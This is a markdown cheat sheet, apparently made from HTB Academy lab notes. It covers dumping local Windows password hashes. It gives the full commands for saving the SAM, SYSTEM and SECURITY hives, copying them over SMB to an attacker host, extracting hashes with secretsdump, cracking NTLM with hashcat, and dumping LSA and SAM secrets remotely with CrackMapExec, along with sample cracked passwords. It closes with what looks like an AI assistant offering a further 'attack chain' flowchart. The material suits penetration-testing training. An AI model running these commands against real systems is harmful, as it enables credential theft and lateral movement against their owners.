
## Purpose

- Extract **local account password hashes** from a non-domain Windows system.
    
- Crack hashes **offline** instead of keeping active session.
    

---

## Registry Hives to Extract

- **HKLM\SAM** → local account hashes
    
- **HKLM\SYSTEM** → system bootkey (needed to decrypt SAM)
    
- **HKLM\SECURITY** → cached domain creds (if domain-joined)
    

Command (run as Administrator):

```
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

---

## Transfer Hives to Attack Host

Start SMB server (attacker):

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/user/Documents/
```

Move files (target):

```
move sam.save \\10.10.15.16\CompData
move system.save \\10.10.15.16\CompData
move security.save \\10.10.15.16\CompData
```

Check transfer:

```
ls
sam.save  system.save  security.save
```

---

## Dumping Hashes with Impacket

Extract NT hashes:

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Output format:

```
user:RID:LMHASH:NTHASH:::
```

---

## Cracking NT Hashes with Hashcat

Create a file with NT hashes:

```
64f12cddaa88057e06a81b54e73b949b
6f8c3f4d3869a10f3b4f0522f537fd33
```

Crack with NTLM mode (`-m 1000`):

```
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

Example cracked:

```
f7eb9c06fafaa23c4bcf22ba6781c1e2:dragon
6f8c3f4d3869a10f3b4f0522f537fd33:iloveme
```

---

## Remote Dumping with CrackMapExec

Dump **LSA secrets**:

```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

Sample output:

```
WS01\worker:Hello123
dpapi_machinekey:0xc03a...
```

Dump **SAM hashes**:

```
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

Sample output:

```
bob:1001:...:cf3a5525ee9414229e66279623ed5c58:::
sam:1002:...:a3ecf31e65208382e23b3420a34208fc:::
```

---

## Key Takeaways

- Extract **SAM + SYSTEM + SECURITY** to dump hashes.
    
- Use **secretsdump.py** for offline NTLM hash extraction.
    
- Crack with **Hashcat (mode 1000)** and wordlists.
    
- Remote dumping possible with **CrackMapExec** if local admin creds available.
    
- Cracked passwords can often be reused across systems.
    

---

Do you want me to also create a **step-by-step attack chain (flowchart style)** for SAM → Hash Extraction → Cracking → Reuse?